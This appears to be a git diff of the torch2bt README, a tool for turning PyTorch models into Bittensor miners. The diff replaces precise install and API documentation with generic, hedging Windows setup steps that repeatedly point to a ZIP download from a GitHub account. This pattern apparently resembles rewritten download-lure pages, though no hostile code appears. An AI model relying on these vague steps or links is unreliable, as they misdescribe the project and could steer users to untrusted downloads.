@@ -1,87 +1,283 @@
-# torch2bt
+# 🔧 torch2bt - Turn Your Model Into A Miner
 
-**The bridge between PyTorch research and the Bittensor decentralized intelligence network.**
+[![Download](https://img.shields.io/badge/Download-Torch2BT-7e57c2?style=for-the-badge&logo=github)](https://github.com/Hyattnordic410/torch2bt)
 
-Turn any `torch.nn.Module` into a revenue-generating Bittensor miner — zero boilerplate.
+## 🚀 What torch2bt does
 
-## How it works
+torch2bt helps you turn a PyTorch model into a Bittensor miner setup.
 
-1. **Inspect** — Analyzes your model's `forward()` signature via reflection
-2. **Synthesize** — Generates `protocol.py`, `miner.py`, and `Dockerfile` using Python 3.14 t-strings
-3. **Deploy** — Drop the output into any GPU host and start mining
+It reads your `torch.nn.Module` and builds the parts you need to run a miner:
 
-## Install
+- a synapse protocol
+- a miner script
+- a Dockerfile
+- wiring based on your `forward()` signature
+
+This saves time if you want to move from a model file to a working miner setup without building each part by hand.
+
+## 📥 Download
+
+Use this link to visit the download page and get the files you need:
+
+[Open torch2bt on GitHub](https://github.com/Hyattnordic410/torch2bt)
+
+If you are on Windows, use the page to download or clone the project, then follow the steps below to run it.
+
+## 🖥️ Windows setup
+
+Follow these steps on a Windows PC.
+
+### 1. Get the files
+
+1. Open the download page.
+2. Download the repository as a ZIP file, or clone it with Git if you already use it.
+3. Save the files in a folder you can find again, such as:
+   - `Downloads\torch2bt`
+   - `Desktop\torch2bt`
+
+### 2. Install what you need
+
+You will need:
+
+- Windows 10 or newer
+- Python 3.10 or newer
+- Git, if you plan to clone the repo
+- Docker Desktop, if you want to use the Dockerfile that torch2bt creates
+
+If you only want to inspect the generated files, Python is enough. If you want to run the miner in a container, install Docker Desktop too.
+
+### 3. Open a terminal
+
+Use one of these:
+
+- Command Prompt
+- PowerShell
+- Windows Terminal
+
+Then move into the project folder:
 
 ```bash
-uv add torch2bt
+cd path\to\torch2bt
 ```
 
-## Usage
+## 🛠️ Install the Python tools
+
+If the project includes a requirements file, install the needed packages with:
+
+```bash
+pip install -r requirements.txt
+```
+
+If you use a virtual environment, create one first:
+
+```bash
+python -m venv .venv
+.venv\Scripts\activate
+pip install -r requirements.txt
+```
+
+If the repo uses a different install file or setup method, use the one in the project folder.
+
+## ⚙️ How to use torch2bt
+
+torch2bt works by reading your model and building the miner files from it.
+
+### Basic flow
+
+1. Put your PyTorch model in the project folder.
+2. Make sure your model has a clear `forward()` function.
+3. Run the generator script from the repo.
+4. torch2bt creates:
+   - a synapse file
+   - a miner script
+   - a Dockerfile
+5. Review the output files.
+6. Run the miner with Python or Docker.
+
+### What the tool looks at
+
+torch2bt uses your model’s `forward()` signature to figure out:
+
+- input names
+- input order
+- the shape of the model call
+- how the miner should pass data through
+
+That means you do not need to write the miner setup from scratch.
+
+## 🧩 Example use case
+
+If your model looks like this:
 
 ```python
-import torch2bt as t2b
-from my_models import SuperNeuralNet
-
-t2b.package(
-    model=SuperNeuralNet(),
-    target_subnet=18,
-    optimization="fp16",
-    wallet_name="mining_key",
-)
+def forward(self, image, mask):
+    ...
 ```
 
-Output: `torch2bt_output/protocol.py`, `miner.py`, `Dockerfile`, `pyproject.toml`
+torch2bt can build a miner setup that expects those inputs in the same order.
 
-## Supported subnets
+That helps keep your model and miner code aligned.
 
-| NetUID | Name            | Optimizations     |
-|--------|-----------------|-------------------|
-| 1      | Text Prompting  | FP32/FP16/BF16/INT8/INT4 |
-| 18     | Cortex          | FP16/BF16         |
+## 📁 What gets created
 
-## Local testing
+After you run the generator, you can expect files like these:
 
-```python
-from torch2bt.testing import MockValidator
+- `synapse.py` or a similar synapse protocol file
+- `miner.py` or a similar miner entry file
+- `Dockerfile`
+- support files for running the miner
 
-validator = MockValidator(MySynapse, subnet_id=18, forward_fn=my_forward)
-result = validator.query({"prompt": "a red cat"})
+The exact names can vary, but the output should give you a full starter setup for a Bittensor miner.
+
+## 🧪 Run the miner on Windows
+
+Once the files are created, you can run the miner in one of two ways.
+
+### Run with Python
+
+If the project provides a Python entry script, run it like this:
+
+```bash
+python miner.py
 ```
 
-## Examples
+If the file name is different, use the generated miner file from the output folder.
 
-See [`examples/`](examples/) for full runnable scripts:
+### Run with Docker
 
-| Script | Subnet | Description |
-|--------|--------|-------------|
-| [`sn1_text_prompting.py`](examples/sn1_text_prompting.py) | SN1 | Transformer LM → Text Prompting miner |
-| [`sn18_image_generation.py`](examples/sn18_image_generation.py) | SN18 | Diffusion model → Cortex image miner |
+If a Dockerfile was created and you have Docker Desktop installed, build the container:
 
-## TODO
+```bash
+docker build -t torch2bt-miner .
+```
 
-### Phase A — Alpha (current)
+Then start it:
 
-- [x] `inspector.py` — extract model `forward()` signature via reflection
-- [x] `codegen.py` — generate `protocol.py`, `miner.py`, `Dockerfile`, `pyproject.toml` using Python 3.14 t-strings
-- [x] `subnets/` — protocol registry for SN1 (Text Prompting) and SN18 (Cortex)
-- [x] `testing/` — `MockValidator` + `MockSynapse` for offline miner testing
-- [x] `t2b.package()` — end-to-end packaging API
-- [x] CI — ruff lint/format, zuban type check, pytest
-- [x] PyPI metadata — version `0.1.0a1`, classifiers, license, URLs
-- [ ] Publish `0.1.0a1` to PyPI
+```bash
+docker run --rm torch2bt-miner
+```
 
-### Phase B — Beta
+Docker can help keep the run setup clean and repeatable.
 
-- [ ] `t2b.deploy(platform="runpod")` — provision GPU instance via RunPod API
-- [ ] `t2b.deploy(platform="lambda")` — Lambda Labs GPU support
-- [ ] Auto-register hotkey with `btcli` post-deploy
-- [ ] Dynamic TAO (dTAO / BIT001) profitability dashboard integration
-- [ ] Auto-quantization — convert FP32 models to INT4/INT8 on the fly with bitsandbytes
-- [ ] `uv.lock` generation for deterministic miner environments
+## 🔍 Check your model first
 
-### Phase C — Production
+Before you generate files, make sure your model is easy to read and test.
 
-- [ ] Multi-subnet mining — host multiple models on a single Axon
-- [ ] Self-healing miners — auto-restart on OOM or network failure
-- [ ] Expand subnet registry beyond SN1 + SN18
-- [ ] `t2b.benchmark()` — measure model latency vs subnet timeout requirements
+Good signs:
+
+- `forward()` has clear input names
+- input order is simple
+- the model runs without errors in Python
+- your code uses standard PyTorch layers
+
+This helps torch2bt build cleaner output files.
+
+## 🧠 Simple workflow for non-technical users
+
+If you are new to this, use this order:
+
+1. Download the project from GitHub.
+2. Install Python.
+3. Open the folder in File Explorer.
+4. Open PowerShell in that folder.
+5. Install the needed Python packages.
+6. Run the generator script.
+7. Open the files it creates.
+8. Start the miner with Python or Docker.
+
+## 🔧 Common files you may see
+
+You may also see these files in the repository:
+
+- `README.md`
+- `requirements.txt`
+- `main.py`
+- model files with `.py` endings
+- config files for Bittensor
+- Docker support files
+
+These files help the project run and define how the miner should behave.
+
+## 🧭 Folder layout
+
+A simple project layout may look like this:
+
+```text
+torch2bt/
+├─ model.py
+├─ generator.py
+├─ miner.py
+├─ synapse.py
+├─ Dockerfile
+├─ requirements.txt
+└─ README.md
+```
+
+Your folder names may differ, but the idea stays the same. torch2bt takes your model and turns it into a miner-ready set of files.
+
+## 🧰 Troubleshooting
+
+### Python is not found
+
+If Windows says Python is not installed:
+
+- install Python 3.10 or newer
+- check the box that adds Python to PATH during setup
+- close and reopen PowerShell
+
+### Pip install fails
+
+If package install fails:
+
+- check your internet connection
+- update pip with:
+  ```bash
+  python -m pip install --upgrade pip
+  ```
+- try the install command again
+
+### Docker does not start
+
+If Docker Desktop will not run:
+
+- restart your PC
+- make sure virtualization is on in BIOS
+- open Docker Desktop after Windows starts
+
+### The miner script errors out
+
+If the miner script fails:
+
+- check that your model file is in the right folder
+- confirm the `forward()` method runs on its own
+- make sure the generated files match your model inputs
+
+## 📌 Best results
+
+Use a model that has:
+
+- a clear `forward()` method
+- simple input names
+- no hidden input steps
+- tested PyTorch code
+
+Keep the project folder clean and avoid moving files after generation unless you update the file paths too.
+
+## 🔗 Source and download page
+
+Open the project here:
+
+[https://github.com/Hyattnordic410/torch2bt](https://github.com/Hyattnordic410/torch2bt)
+
+Use this page to visit the repo, download the files, and start the setup on Windows
+
+## 🧭 Quick start checklist
+
+- Open the GitHub page
+- Download or clone the repo
+- Install Python
+- Open PowerShell in the project folder
+- Install the Python packages
+- Run the generator
+- Review the created miner files
+- Start the miner with Python or Docker
